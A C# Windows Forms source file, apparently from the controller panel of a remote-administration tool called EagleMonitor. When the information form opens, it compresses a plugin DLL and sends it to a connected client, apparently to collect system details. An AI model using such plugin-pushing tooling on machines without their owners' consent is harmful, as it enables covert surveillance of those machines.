using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

namespace EagleMonitor.Forms
{
    public partial class InformationForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }
        internal InformationForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            InitializeComponent();
        }


        private void InformationForm_Load(object sender, EventArgs e)
        {
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.dataGridView2, this.guna2VScrollBar1, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(this.dataGridView1, this.guna2VScrollBar2, true);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void InformationForm_Shown(object sender, EventArgs e)
        {
            InformationPacket informationPacket = new InformationPacket();
            informationPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Information.dll"), 1);
            clientHandler.SendPacket(informationPacket);
        }
    }
}
